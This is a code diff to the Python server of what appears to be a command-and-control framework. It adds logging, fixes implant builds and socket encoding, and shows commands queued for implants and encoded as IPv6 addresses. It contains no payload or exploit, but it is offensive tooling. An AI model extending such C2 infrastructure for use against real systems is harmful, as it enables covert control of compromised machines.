@@ -53,7 +53,7 @@ logging.basicConfig(
 
 def verify_auth_token(uri, received_token, received_timestamp):
     """
-    Verifies HMAC auth tokens sent by clients to verify identity
+    Verifies HMAC auth tokens sent by clients to confirm authorization
     :param uri: The URI that the request came to
     :param received_token: The HMAC token sent with the request
     :param received_timestamp: The timestamp that the token was sent
@@ -82,18 +82,30 @@ def build_implant(protocol):
     :param protocol: The protocol to communicate over
     :return: bool depending on build success
     """
+    logger.info("building implant")
     match protocol:
         case "http":
             try:
-                os.chdir("./implant")
-                subprocess.run(["go", "build", "-tags", "http", "./http"],check=True, capture_output=True, text=True)
+                result = subprocess.run(
+                    ["go", "build", "-tags", "http", "./http"],
+                    cwd='./implant',
+                    check=True,
+                    capture_output=True,
+                    text=True
+                )
+                logger.info("success building")
+                print(result)
                 return True
             except subprocess.CalledProcessError as e:
                 logger.error(f"error building: {e}")
+                logger.error(f"stdout: {e.stdout}")
+                logger.error(f"stderr: {e.stderr}")
                 return False
             except Exception as e:
                 logger.error(f"general exception occurred: {e}")
                 return False
+        case _:
+            logger.error("no case match found")
 
 
 def add_user(new_user_id):
@@ -245,11 +257,12 @@ def handle_client(client_socket):
                 request_type, uname, token, *message = client_request.split(" ", 3)
                 logger.info(f"checking session token")
                 if token in operator_session_tokens:
-                    bld_status = build_implant(message)
+                    bld_status = build_implant(message[0])
+                    print(bld_status)
                     if bld_status is True:
-                        client_socket.send("Building implant succeeded!")
+                        client_socket.send("Building implant succeeded!".encode())
                     else:
-                        client_socket.send("Building implant failed...")
+                        client_socket.send("Building implant failed...".encode())
                 else:
                     client_socket.send(f"Bad token\n".encode())
                     logger.error("bad token")
@@ -259,7 +272,8 @@ def handle_client(client_socket):
                 client_socket.send("Unknown command\n".encode())
 
     except Exception as e:
-        logger.error(f"Error occurred when trying to receive connection {e}")
+        logger.error(f"Error occurred when trying to receive connection: {e}")
+        client_socket.send(f"Error: {e}\n".encode())
     finally:
         client_socket.close()
 
@@ -279,7 +293,7 @@ def authenticated_get(path):
         try:
             operator, command = get_waiting_command(path)
             if operator and command is False:
-                logger.error("operator and command in queue are false")
+                logger.error("operator and command in queue returned as false")
                 return "error"
             checkout_command(path, operator)
             command = json.dumps(ipv6_encoder.string_to_ipv6(command))
